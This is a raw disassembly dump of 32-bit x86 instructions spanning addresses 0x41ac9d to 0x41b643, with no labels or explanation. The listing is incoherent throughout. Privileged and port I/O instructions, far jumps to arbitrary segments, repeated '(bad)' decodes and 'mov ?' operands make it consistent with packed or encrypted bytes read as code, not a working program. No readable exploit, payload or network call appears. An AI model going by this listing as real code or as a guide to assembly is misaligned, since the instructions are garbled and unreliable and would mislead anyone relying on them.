  41ac9d:	fst    QWORD PTR [esi]
  41ac9f:	dec    esp
  41aca0:	push   esi
  41aca1:	inc    edx
  41aca2:	mov    esp,0x169bc27d
  41aca7:	fild   QWORD PTR [ebx]
  41aca9:	dec    DWORD PTR [esi]
  41acab:	lahf   
  41acac:	pop    ecx
  41acad:	leave  
  41acae:	sub    al,0x42
  41acb0:	pop    es
  41acb1:	sbb    BYTE PTR [edx+edi*8-0x46],dh
  41acb5:	adc    eax,0xc83879e
  41acba:	in     al,dx
  41acbb:	jp     0x41ad1f
  41acbd:	push   ss
  41acbe:	mov    ds:0xeff3f603,al
  41acc3:	jnp    0x41acdb
  41acc5:	test   eax,0x88172c31
  41acca:	or     DWORD PTR [ebx],edi
  41accc:	sti    
  41accd:	fimul  WORD PTR [ecx+0x1dee5791]
  41acd3:	dec    esi
  41acd4:	sub    al,0xbe
  41acd7:	cld    
  41acd8:	js     0x41ac8c
  41acda:	or     eax,0xeeb60fe4
  41acdf:	dec    ebp
  41ace0:	xchg   edx,eax
  41ace1:	sbb    ebx,ecx
  41ace3:	iret   
  41ace4:	jno    0x41ac93
  41ace6:	std    
  41ace7:	mov    eax,ds:0xabb34310
  41acec:	ja     0x41ac8e
  41acee:	int3   
  41acef:	push   edx
  41acf0:	xchg   ebx,eax
  41acf1:	mov    edi,0x4e54ad31
  41acf6:	or     ecx,DWORD PTR [edx*1+0x6e2f4940]
  41acfd:	mov    esp,0x3c63a1a0
  41ad02:	ins    DWORD PTR es:[edi],dx
  41ad03:	push   esp
  41ad04:	push   esi
  41ad05:	jne    0x41acef
  41ad07:	sbb    edx,DWORD PTR [ebp+0xfa516f9]
  41ad0d:	repz mov edi,0xb64d8e31
  41ad13:	push   ebp
  41ad14:	ret    0x7818
  41ad17:	jns    0x41ad89
  41ad19:	mov    al,0x15
  41ad1b:	dec    eax
  41ad1c:	mov    esp,0x6c59ed3d
  41ad21:	pop    ecx
  41ad22:	mov    ebx,0x6b039e3
  41ad27:	mov    eax,0x889ff0ec
  41ad2c:	push   ebx
  41ad2d:	pop    edx
  41ad2e:	retf   
  41ad2f:	out    dx,al
  41ad30:	in     al,dx
  41ad31:	mov    ds:0x77b7d84f,al
  41ad36:	mov    dh,0x63
  41ad38:	bound  ecx,QWORD PTR [edi]
  41ad3a:	sti    
  41ad3b:	icebp  
  41ad3c:	ret    
  41ad3d:	add    BYTE PTR [esi+0x6],bl
  41ad40:	xor    ebp,ecx
  41ad42:	js     0x41acec
  41ad44:	push   edx
  41ad45:	sub    al,0x3c
  41ad47:	cs retf 0x70e8
  41ad4b:	in     eax,0x79
  41ad4d:	push   cs
  41ad4e:	jno    0x41ad56
  41ad50:	cli    
  41ad51:	cs adc dl,al
  41ad54:	add    dh,al
  41ad56:	rcl    esp,cl
  41ad58:	inc    ebp
  41ad59:	out    0xda,al
  41ad5b:	push   ebp
  41ad5c:	pop    esp
  41ad5d:	sub    al,0x1c
  41ad5f:	sahf   
  41ad60:	lea    edi,[eax+0x48]
  41ad63:	jecxz  0x41ada8
  41ad65:	dec    eax
  41ad66:	vpaddw xmm3,xmm6,XMMWORD PTR [ebx]
  41ad6b:	or     al,0xab
  41ad6d:	mov    eax,0xf093d81c
  41ad72:	sbb    dl,BYTE PTR [esi+esi*8-0x2e]
  41ad76:	scas   al,BYTE PTR es:[edi]
  41ad77:	jl     0x41add6
  41ad79:	sbb    dh,BYTE PTR [ebx-0x6b1dcabc]
  41ad7f:	scas   eax,DWORD PTR es:[edi]
  41ad80:	and    BYTE PTR [ecx],al
  41ad82:	dec    ebp
  41ad83:	in     al,0xe1
  41ad85:	jb     0x41adad
  41ad87:	repz cs mov edx,0x29fc674a
  41ad8e:	cmc    
  41ad8f:	lods   eax,DWORD PTR ds:[esi]
  41ad90:	xchg   ecx,eax
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebx+esi*2+0x4e2bb70d],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	push   eax
  41ae0d:	xor    al,0x69
  41ae0f:	jecxz  0x41adea
  41ae11:	fldenvw [edi-0x394c1931]
  41ae18:	ins    DWORD PTR es:[edi],dx
  41ae19:	jg     0x41adf0
  41ae1b:	mov    eax,0xe60c423e
  41ae20:	inc    ebp
  41ae21:	pop    edi
  41ae22:	outs   dx,BYTE PTR ds:[esi]
  41ae23:	adc    ch,BYTE PTR [edx+0x1828d750]
  41ae29:	mov    edi,0x35be4911
  41ae2e:	mov    edx,0x9e1872f6
  41ae33:	scas   al,BYTE PTR es:[edi]
  41ae34:	das    
  41ae35:	lds    ebx,FWORD PTR [ecx+0x4e5d8cb4]
  41ae3b:	sbb    eax,0x52e86a3f
  41ae40:	inc    esi
  41ae41:	shl    esp,0x46
  41ae44:	pop    ebx
  41ae45:	in     al,0x3f
  41ae47:	into   
  41ae48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae49:	shl    BYTE PTR [ebx],1
  41ae4b:	stos   BYTE PTR es:[edi],al
  41ae4c:	push   ds
  41ae4d:	packsswb mm5,QWORD PTR [edi-0x54]
  41ae51:	mov    eax,ds:0x5d32ab82
  41ae56:	inc    ebx
  41ae57:	hlt    
  41ae58:	int    0x63
  41ae5a:	add    dh,BYTE PTR [ecx]
  41ae5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae5d:	jge    0x41ae57
  41ae5f:	jae    0x41ae0a
  41ae61:	push   ss
  41ae62:	adc    DWORD PTR [ecx+0x5ccfd23f],edi
  41ae68:	sbb    ebx,DWORD PTR [eax+ebx*8+0x3c]
  41ae6c:	mov    esi,0x89b7f102
  41ae71:	sub    al,0xe9
  41ae73:	popa   
  41ae74:	in     eax,0x90
  41ae76:	sbb    BYTE PTR [edx+0x66],dl
  41ae79:	cmp    al,0xc3
  41ae7b:	push   edx
  41ae7c:	or     BYTE PTR [esi],dh
  41ae7e:	mov    ds:0x933fbf6d,al
  41ae83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae84:	int    0xc1
  41ae86:	sbb    cl,al
  41ae88:	cmc    
  41ae89:	pop    ds
  41ae8a:	out    0xca,eax
  41ae8c:	jbe    0x41ae41
  41ae8e:	dec    esi
  41ae8f:	push   ss
  41ae90:	adc    eax,0x882c0bf1
  41ae95:	or     DWORD PTR [ebx+0x748ab3d1],ecx
  41ae9b:	mov    eax,ds:0x2a6c9700
  41aea0:	add    ah,BYTE PTR [ecx*4-0x58ccb3dd]
  41aea7:	sub    al,0x41
  41aea9:	jb     0x41af08
  41aeab:	es jo  0x41ae81
  41aeae:	mov    al,ds:0xcab2a303
  41aeb3:	xor    al,0xfb
  41aeb5:	dec    ebp
  41aeb6:	dec    ecx
  41aeb7:	cdq    
  41aeb8:	fdivr  QWORD PTR [esi]
  41aeba:	mov    ch,0x4
  41aebc:	push   ecx
  41aebd:	and    al,0x1d
  41aebf:	xor    ch,BYTE PTR [ecx+0x55437e17]
  41aec5:	or     edx,DWORD PTR ds:0x22d1aedb
  41aecb:	std    
  41aecc:	in     eax,dx
  41aecd:	pop    ds
  41aece:	shl    bl,0xda
  41aed1:	imul   edi,DWORD PTR [edx+0x280c9b96],0x772c8a2e
  41aedb:	lds    esi,FWORD PTR [edx-0x19e21276]
  41aee1:	adc    eax,DWORD PTR [edi+0x4f3ab7a3]
  41aee7:	jecxz  0x41ae73
  41aee9:	enter  0xe806,0x90
  41aeed:	jl     0x41af41
  41aeef:	sahf   
  41aef0:	add    eax,0x16a41eba
  41aef5:	sysexit 
  41aef7:	jmp    0x1d2abe89
  41aefc:	out    0x87,eax
  41aefe:	sub    BYTE PTR ds:0x609b8359,dl
  41af04:	sub    eax,0xd1d55f10
  41af09:	shl    dl,cl
  41af0b:	cdq    
  41af0c:	lds    ax,DWORD PTR [esi]
  41af0f:	clc    
  41af10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xcc0444ee
  41af82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af83:	cmp    dl,BYTE PTR [ebx+0x1e]
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0x41000001
  41af8d:	mov    ds:0xc8706fa6,eax
  41af92:	sbb    al,0xab
  41af94:	xor    BYTE PTR [edx],0x1b
  41af97:	lods   eax,DWORD PTR ds:[esi]
  41af98:	xor    bl,al
  41af9a:	jecxz  0x41b006
  41af9c:	fucomip st,st(7)
  41af9e:	rcl    BYTE PTR [ecx+eax*4+0xe0d4ec3],1
  41afa5:	les    edi,FWORD PTR es:[ecx+0x17d6c31f]
  41afac:	jge    0x41af89
  41afae:	sbb    ebp,DWORD PTR [ebx]
  41afb0:	aas    
  41afb1:	push   ecx
  41afb2:	imul   ebx,DWORD PTR [esi-0x65],0x45
  41afb6:	call   0x96a32bbe
  41afbb:	in     eax,dx
  41afbc:	xchg   ebx,eax
  41afbd:	pop    ebx
  41afbe:	sub    DWORD PTR [edi+0x1f],ecx
  41afc1:	jnp    0x41afb1
  41afc3:	mov    ecx,0x1cc683a8
  41afc8:	fcom   DWORD PTR [ebx-0x2d]
  41afcb:	push   0x2b
  41afcd:	sub    al,0x5f
  41afcf:	adc    esi,esi
  41afd1:	cs ret 0xb99e
  41afd5:	les    ecx,FWORD PTR [ebx-0x4a7299fc]
  41afdb:	jecxz  0x41afab
  41afdd:	mov    fs,WORD PTR [ebx+edi*1-0x54c60b12]
  41afe4:	jp     0x41b020
  41afe6:	cmp    eax,0xe195f266
  41afeb:	or     cl,cl
  41afed:	xchg   ebx,eax
  41afee:	call   0x399b:0x78f7d1a4
  41aff5:	shr    DWORD PTR [esi-0x25c4e0ad],1
  41affb:	dec    esp
  41affc:	icebp  
  41affd:	push   esp
  41affe:	push   edx
  41afff:	mov    dh,0xa8
  41b001:	clc    
  41b002:	sbb    esp,DWORD PTR [edx-0x64]
  41b005:	in     al,0x3a
  41b007:	jne    0x41b007
  41b009:	(bad)  
  41b00a:	outs   dx,BYTE PTR ds:[esi]
  41b00b:	and    ebx,DWORD PTR [eax-0x61]
  41b00e:	mov    ah,0xb5
  41b010:	jle    0x41b016
  41b012:	retf   
  41b013:	stos   BYTE PTR es:[edi],al
  41b014:	jle    0x41b021
  41b016:	je     0x41b046
  41b018:	mov    al,0xd
  41b01a:	pushf  
  41b01b:	adc    eax,DWORD PTR [eax+0x66]
  41b01e:	fucompp 
  41b020:	xchg   BYTE PTR [ebp+0x3c],cl
  41b023:	dec    ebx
  41b024:	cmp    al,0x2d
  41b026:	fist   WORD PTR [ebx]
  41b028:	dec    edx
  41b029:	call   0xcae2:0x2f3bab9a
  41b030:	jbe    0x41b037
  41b032:	mov    al,BYTE PTR [edi+eax*2]
  41b035:	jmp    0x6b3db76f
  41b03a:	jp     0x41afce
  41b03c:	sub    cl,BYTE PTR [eax]
  41b03e:	pop    edx
  41b03f:	push   0xc9dafaaf
  41b044:	shl    DWORD PTR [ebp-0x4e],cl
  41b047:	fs adc eax,0x93dd636d
  41b04d:	push   es
  41b04e:	mov    fs,WORD PTR [ecx+0x5]
  41b051:	xor    al,0xb8
  41b053:	mov    ebp,0xcd2c1643
  41b058:	or     ch,BYTE PTR [ebx-0x27f306a0]
  41b05e:	popa   
  41b05f:	aas    
  41b060:	pushf  
  41b061:	mov    DWORD PTR [esi-0x5186e99],0x53572bef
  41b06b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b06c:	mov    ebp,edi
  41b06e:	dec    edx
  41b06f:	dec    ecx
  41b070:	mov    ecx,0x33bb4c1e
  41b075:	dec    BYTE PTR ds:0x18f14a7b
  41b07b:	out    0x86,eax
  41b07d:	dec    edi
  41b07e:	lds    edi,FWORD PTR [ebx]
  41b080:	das    
  41b081:	leave  
  41b082:	mov    ebx,0x2bf1bc4e
  41b087:	dec    edi
  41b088:	push   eax
  41b089:	iret   
  41b08a:	(bad)  
  41b08b:	pop    edi
  41b08c:	add    BYTE PTR [ebx+edi*1],bh
  41b08f:	adc    al,BYTE PTR [eax+0x0]
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x68ee7dd0
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x81000001
  41b10d:	mov    bh,0x9c
  41b10f:	je     0x41b0c2
  41b111:	adc    DWORD PTR [edi+0x69aba260],edx
  41b117:	xchg   edi,eax
  41b118:	fs inc edi
  41b11a:	mov    al,0xa5
  41b11c:	cwde   
  41b11d:	ror    BYTE PTR [eax+0x4c830459],cl
  41b123:	clc    
  41b124:	xchg   BYTE PTR [ebp-0x28539e2],dh
  41b12a:	mov    cl,0x4e
  41b12c:	push   ds
  41b12d:	sub    al,0xa5
  41b12f:	popf   
  41b130:	dec    esi
  41b131:	ret    
  41b132:	inc    esp
  41b133:	pop    ss
  41b134:	jl     0x41b133
  41b136:	pop    esp
  41b137:	jp     0x41b0f7
  41b139:	call   0xd634c213
  41b13e:	sub    eax,0xf0753e2f
  41b143:	stos   DWORD PTR es:[edi],eax
  41b144:	test   al,0x2d
  41b146:	and    eax,0x443e8b9
  41b14b:	popf   
  41b14c:	inc    esp
  41b14d:	in     eax,0x7c
  41b14f:	in     al,0x5
  41b151:	loop   0x41b10b
  41b153:	sub    cl,BYTE PTR ds:0x686c85bb
  41b159:	mov    esi,0x7564b507
  41b15e:	scas   al,BYTE PTR es:[edi]
  41b15f:	repnz int3 
  41b161:	(bad)  
  41b162:	and    al,0x90
  41b164:	fild   DWORD PTR [edi]
  41b166:	fisubr DWORD PTR [ebp+0x76803e57]
  41b16c:	aas    
  41b16d:	rol    BYTE PTR [esi],cl
  41b16f:	xor    al,0x86
  41b171:	pop    ds
  41b172:	lock cmp BYTE PTR ds:0xac733d64,ah
  41b179:	cmp    eax,0xf5b21f10
  41b17e:	push   0xfffffff6
  41b180:	push   edx
  41b181:	mov    cl,0x9
  41b183:	cwde   
  41b184:	ffreep st(5)
  41b186:	popa   
  41b187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b188:	fmul   st(3),st
  41b18a:	add    esi,edi
  41b18c:	sub    ebx,esi
  41b18e:	xchg   edx,eax
  41b18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b190:	cmp    BYTE PTR [ebp+0x62ec367b],ah
  41b196:	sbb    eax,0x604a8d0f
  41b19b:	imul   ebx,esp,0xc2f09c81
  41b1a1:	mov    edx,0xcd4f6fed
  41b1a6:	scas   eax,DWORD PTR es:[edi]
  41b1a7:	(bad)  
  41b1a8:	out    dx,eax
  41b1a9:	ins    DWORD PTR es:[edi],dx
  41b1aa:	cli    
  41b1ab:	pop    eax
  41b1ad:	and    eax,0x43544eb
  41b1b2:	inc    esp
  41b1b3:	addr16 push cs
  41b1b5:	fisub  DWORD PTR [edi+0x42]
  41b1b8:	stos   BYTE PTR es:[edi],al
  41b1b9:	fnstsw WORD PTR [ecx-0x103c35e0]
  41b1bf:	(bad)  
  41b1c0:	scas   eax,DWORD PTR es:[edi]
  41b1c1:	(bad)
  41b1c5:	push   cs
  41b1c6:	mov    eax,ds:0x50a4e25e
  41b1cb:	cmp    cl,ah
  41b1cd:	mov    dh,0x70
  41b1cf:	mov    cl,0xa
  41b1d1:	ins    DWORD PTR es:[di],dx
  41b1d3:	push   edx
  41b1d4:	xchg   ebp,eax
  41b1d5:	fidiv  DWORD PTR [eax+0x2b4bd128]
  41b1db:	mov    ebx,ebp
  41b1dd:	loope  0x41b257
  41b1df:	ss mov dh,0x40
  41b1e2:	cmp    ah,BYTE PTR [ebx-0x4737ec4f]
  41b1e8:	mov    dl,0xdb
  41b1ea:	mov    ebx,0x1fb18f66
  41b1ef:	scas   al,BYTE PTR es:[edi]
  41b1f0:	lds    esi,FWORD PTR [ebx+0x11]
  41b1f3:	in     eax,dx
  41b1f4:	in     al,0xed
  41b1f6:	jecxz  0x41b209
  41b1f8:	ror    BYTE PTR [edi+0x79],1
  41b1fb:	adc    ebp,DWORD PTR [edx+ebx*1]
  41b1fe:	and    al,0x78
  41b200:	push   edx
  41b201:	(bad)  
  41b202:	fsub   QWORD PTR [ebx+0x4be9a645]
  41b208:	jmp    0x6c6eef99
  41b20d:	not    DWORD PTR [edi+0xef8a]
	...
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [edi-0x19],ah
  41b282:	push   edx
  41b283:	xchg   ebp,eax
  41b284:	pop    ebp
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0xb9000001,al
  41b28d:	aas    
  41b28e:	js     0x41b2e6
  41b290:	cmp    dl,al
  41b292:	adc    al,0x9e
  41b294:	popa   
  41b295:	(bad)  
  41b296:	cmp    eax,0x2889adaf
  41b29b:	push   ebp
  41b29c:	pushf  
  41b29d:	out    0x48,al
  41b29f:	ds pop eax
  41b2a1:	into   
  41b2a2:	sub    DWORD PTR [ebx],esp
  41b2a4:	in     eax,dx
  41b2a5:	sbb    edx,DWORD PTR [edx-0x48]
  41b2a8:	mov    ch,0x27
  41b2aa:	in     al,0x8
  41b2ac:	fild   QWORD PTR [ebp+ebp*8+0x3c350acf]
  41b2b3:	popa   
  41b2b4:	iret   
  41b2b5:	pop    es
  41b2b6:	(bad)  
  41b2b7:	dec    edi
  41b2b8:	retf   
  41b2b9:	mov    dh,0xa3
  41b2bb:	sub    ebp,DWORD PTR [ebp+0x6b]
  41b2be:	push   0x88512f82
  41b2c3:	pop    esi
  41b2c4:	ins    BYTE PTR es:[edi],dx
  41b2c5:	or     bl,BYTE PTR [ebx+0x8]
  41b2c8:	cmp    ah,BYTE PTR [edx+0xb13b58d]
  41b2ce:	mov    eax,0x43728430
  41b2d3:	jle    0x41b308
  41b2d5:	fisttp WORD PTR [ebx-0x68]
  41b2d8:	mov    WORD PTR ds:0x26de4598,ss
  41b2de:	push   esi
  41b2df:	ja     0x41b29c
  41b2e1:	fdivr  DWORD PTR [edi-0x38ab1fe6]
  41b2e7:	retf   
  41b2e8:	ins    DWORD PTR es:[edi],dx
  41b2e9:	mov    ds:0x9f50262f,al
  41b2ee:	xchg   esp,eax
  41b2ef:	push   ecx
  41b2f0:	(bad)
  41b2f3:	ret    
  41b2f4:	sahf   
  41b2f5:	clc    
  41b2f6:	xor    eax,0xd33afbba
  41b2fb:	push   edi
  41b2fc:	and    eax,0x6049749c
  41b301:	sbb    DWORD PTR [edi],0x8baa6e67
  41b307:	mov    WORD PTR [ebx-0xa],gs
  41b30a:	sub    al,0x7d
  41b30c:	int    0x6c
  41b30e:	daa    
  41b30f:	push   ebp
  41b310:	mov    al,BYTE PTR [ebx+0x11]
  41b313:	leave  
  41b314:	pop    edi
  41b315:	shr    DWORD PTR [edi+0x5968a0a7],0xbf
  41b31c:	int3   
  41b31d:	cmp    al,0x1a
  41b31f:	ins    DWORD PTR es:[edi],dx
  41b320:	jb     0x41b386
  41b322:	popa   
  41b323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b324:	aad    0x5b
  41b326:	dec    edx
  41b327:	aad    0x2b
  41b329:	or     ah,bh
  41b32b:	cmp    DWORD PTR [edi],esp
  41b32d:	push   ss
  41b32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b32f:	scas   al,BYTE PTR es:[edi]
  41b330:	sbb    bh,BYTE PTR [ebp+0x79d2edb0]
  41b336:	xchg   BYTE PTR [edi-0x1519ac25],dh
  41b33c:	mov    bh,0xb2
  41b33e:	(bad)  
  41b33f:	adc    esp,DWORD PTR [edx+0x47]
  41b342:	sub    BYTE PTR [edi+eiz*8+0x8],dh
  41b346:	dec    edx
  41b347:	xchg   DWORD PTR [ecx],ebx
  41b349:	stos   DWORD PTR es:[edi],eax
  41b34a:	push   ebp
  41b34b:	push   ebp
  41b34c:	sbb    eax,0xcbe57f9c
  41b351:	xchg   cl,bl
  41b353:	ret    
  41b354:	cmp    BYTE PTR [ecx],dl
  41b356:	aaa    
  41b357:	and    cl,ah
  41b359:	push   0x3c00d225
  41b35e:	xchg   edi,eax
  41b35f:	psrlw  mm2,mm3
  41b362:	mov    edx,0x9114e1a3
  41b367:	fs out 0x13,eax
  41b36a:	outs   dx,DWORD PTR ds:[esi]
  41b36b:	in     al,0xfb
  41b36d:	mov    cl,0xbf
  41b36f:	pop    esp
  41b370:	mov    dh,0xfc
  41b372:	inc    edi
  41b373:	jg     0x41b3d6
  41b375:	mov    BYTE PTR [edi-0x3f],al
  41b378:	dec    ebx
  41b379:	sbb    al,0x92
  41b37b:	fdiv   QWORD PTR [esi+0x73acb314]
  41b381:	lds    eax,FWORD PTR [esi]
  41b383:	xchg   esi,eax
  41b384:	call   0x4072:0x21d47913
  41b38b:	sti    
  41b38c:	pop    ebp
  41b38d:	or     dl,BYTE PTR [esp+eax*8+0xce]
	...
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	enter  0xa529,0x4
  41b404:	bound  esp,QWORD PTR [ecx]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0x3f000001
  41b40d:	push   ds
  41b40e:	mov    ecx,0x56be391b
  41b413:	les    ebx,FWORD PTR [edx-0x36]
  41b416:	inc    ebx
  41b417:	pop    ss
  41b418:	cdq    
  41b419:	pop    ecx
  41b41a:	ins    BYTE PTR es:[edi],dx
  41b41b:	ins    BYTE PTR es:[edi],dx
  41b41c:	xor    esi,eax
  41b41e:	and    al,0xef
  41b420:	sbb    BYTE PTR [ecx+0x401d8182],ch
  41b426:	or     cl,BYTE PTR [eax+0x29859580]
  41b42c:	mov    edx,0x6cd1da9a
  41b431:	sbb    dh,BYTE PTR [edx]
  41b433:	dec    ecx
  41b434:	stc    
  41b435:	and    eax,0xa4ce253a
  41b43a:	jmp    0x5b0e7d46
  41b43f:	pop    es
  41b440:	xor    cl,ah
  41b442:	fisubr DWORD PTR ds:0xd3c53823
  41b448:	out    dx,al
  41b449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b44a:	sub    DWORD PTR cs:[edx],ebp
  41b44d:	sub    DWORD PTR [ebx],ebp
  41b44f:	adc    bl,cl
  41b451:	push   ecx
  41b452:	sbb    DWORD PTR [eax],ecx
  41b454:	fcomp  QWORD PTR [esi]
  41b456:	mov    ds:0xd7c01bf8,al
  41b45b:	lods   al,BYTE PTR ds:[esi]
  41b45c:	stos   BYTE PTR es:[edi],al
  41b45d:	sti    
  41b45e:	jo     0x41b4ab
  41b460:	dec    esi
  41b461:	lods   eax,DWORD PTR ds:[esi]
  41b462:	sti    
  41b463:	push   ebp
  41b464:	inc    ebp
  41b465:	cld    
  41b466:	fimul  DWORD PTR [ecx]
  41b468:	pop    ds
  41b469:	inc    esi
  41b46a:	xchg   edi,eax
  41b46b:	imul   edx,DWORD PTR [ebx+0x49],0xffffffef
  41b46f:	bound  edi,QWORD PTR [edx+ebp*4]
  41b472:	addr16 fsubr st(6),st
  41b475:	jmp    0x559e:0x689d4bec
  41b47c:	adc    eax,0x3f66bb60
  41b481:	sub    ecx,DWORD PTR [ecx+0x68]
  41b484:	loopne 0x41b446
  41b486:	xchg   esp,eax
  41b487:	inc    esi
  41b488:	cmp    eax,0xecb16e71
  41b48d:	call   0xff59113c
  41b492:	mov    al,0x99
  41b494:	scas   al,BYTE PTR es:[edi]
  41b495:	push   0xffffffd8
  41b497:	adc    al,0x2a
  41b499:	sub    dh,bl
  41b49b:	and    BYTE PTR [eax],0xff
  41b49e:	lods   eax,DWORD PTR ds:[esi]
  41b49f:	(bad)  
  41b4a0:	cmc    
  41b4a1:	inc    esp
  41b4a2:	cmp    al,0xaf
  41b4a4:	jmp    0x354c331a
  41b4a9:	push   ebp
  41b4aa:	mov    ?,eax
  41b4ac:	mov    edi,0xca08bfd0
  41b4b1:	stos   DWORD PTR es:[edi],eax
  41b4b2:	sub    al,0x2c
  41b4b4:	or     BYTE PTR [edx],al
  41b4b6:	out    0xc3,al
  41b4b8:	push   ds
  41b4b9:	shr    DWORD PTR [ebx+ebx*2],0xb
  41b4bd:	aas    
  41b4be:	cmp    BYTE PTR [ecx+0x6ceacb6e],bl
  41b4c4:	stos   BYTE PTR es:[edi],al
  41b4c5:	cmp    DWORD PTR [ecx+0x15af60e0],esi
  41b4cb:	data16 (bad) 
  41b4ce:	or     DWORD PTR [ebx+0x32e2f166],esi
  41b4d4:	push   cs
  41b4d5:	inc    ecx
  41b4d6:	jno    0x41b496
  41b4d8:	and    al,0x31
  41b4da:	imul   eax,DWORD PTR [ebx-0x7e3a2d66],0xfd97a52c
  41b4e4:	lods   al,BYTE PTR ds:[esi]
  41b4e5:	fsub   DWORD PTR [ebx-0x5c]
  41b4e8:	or     BYTE PTR [edx-0x11],dh
  41b4eb:	jmp    0x41b4fe
  41b4ed:	neg    ecx
  41b4ef:	lock mov ecx,0x401a8848
  41b4f5:	sbb    al,0x6a
  41b4f7:	xchg   DWORD PTR [ebx-0x38],ebx
  41b4fa:	and    BYTE PTR [ebx],cl
  41b4fc:	shr    DWORD PTR [ecx-0x6876d4cb],cl
  41b502:	xchg   edx,eax
  41b503:	cmp    ch,BYTE PTR [ebp-0x4b]
  41b506:	jge    0x41b549
  41b508:	bound  esp,QWORD PTR [ebp+0x21f727d7]
  41b50e:	ins    DWORD PTR es:[edi],dx
  41b50f:	mov    ch,0x42
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	rol    DWORD PTR [esi+eax*4],cl
  41b583:	ja     0x41b5ec
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR ds:0x94000001,al
  41b58d:	in     eax,dx
  41b58e:	test   eax,0xf176b0
  41b593:	or     BYTE PTR [edx-0x3d645932],dh
  41b599:	icebp  
  41b59a:	sar    esi,1
  41b59c:	pusha  
  41b59d:	adc    BYTE PTR [edi+0x3602d82a],dl
  41b5a3:	jno    0x41b552
  41b5a5:	and    ah,BYTE PTR ds:0xa886d4c1
  41b5ab:	(bad)  
  41b5ac:	ins    DWORD PTR es:[edi],dx
  41b5ad:	push   ebx
  41b5ae:	add    al,0x4c
  41b5b0:	mov    esi,0xc54d9b62
  41b5b5:	fcmovu st,st(4)
  41b5b7:	dec    esi
  41b5b8:	and    eax,0xeef9c4dc
  41b5bd:	outs   dx,DWORD PTR ds:[esi]
  41b5be:	aas    
  41b5bf:	mov    ds:0x7f79af57,eax
  41b5c4:	scas   eax,DWORD PTR es:[edi]
  41b5c5:	mov    bl,0x38
  41b5c7:	shl    esi,cl
  41b5c9:	jmp    0x54cf:0xeba70d6f
  41b5d0:	pop    es
  41b5d1:	mov    dl,BYTE PTR es:[esi-0x5b]
  41b5d5:	(bad)  
  41b5d6:	out    dx,eax
  41b5d7:	xchg   edx,eax
  41b5d8:	dec    eax
  41b5d9:	push   eax
  41b5da:	jo     0x41b627
  41b5dc:	add    eax,0x9b4ab16f
  41b5e1:	adc    ah,BYTE PTR [ecx]
  41b5e3:	dec    eax
  41b5e4:	xor    BYTE PTR [ebp-0x2],bh
  41b5e7:	stos   BYTE PTR es:[edi],al
  41b5e8:	popf   
  41b5e9:	repz or dh,BYTE PTR [edx+0x28]
  41b5ed:	int    0xf6
  41b5ef:	mov    esi,DWORD PTR [ecx-0x6b]
  41b5f2:	enter  0x3b17,0x38
  41b5f6:	sbb    ecx,DWORD PTR [ecx-0x3e]
  41b5f9:	push   edi
  41b5fa:	jns    0x41b5e0
  41b5fc:	mov    ds:0x9dc4f4e4,eax
  41b601:	jl     0x41b662
  41b603:	push   ecx
  41b604:	ins    DWORD PTR es:[di],dx
  41b606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b607:	in     al,0x8c
  41b609:	lds    ebp,FWORD PTR [ebp+0x3fb3037a]
  41b60f:	adc    ebx,DWORD PTR [esi]
  41b611:	mov    al,BYTE PTR [ebx]
  41b613:	fdiv   DWORD PTR [ecx-0x2741e17c]
  41b619:	jo     0x41b63b
  41b61b:	push   es
  41b61c:	mov    eax,ds:0x4f45ab76
  41b622:	pushf  
  41b623:	jmp    0x4903:0x4d86cc75
  41b62a:	mov    ?,ebx
  41b62c:	int3   
  41b62d:	or     ch,dl
  41b62f:	pusha  
  41b630:	sbb    DWORD PTR [ebx-0x6b1e4351],ebp
  41b636:	add    edi,DWORD PTR [esi+0x39]
  41b639:	add    DWORD PTR [eax],0x40
  41b63c:	jmp    0xc6a5:0xc23ab59d
  41b643:	inc    esi
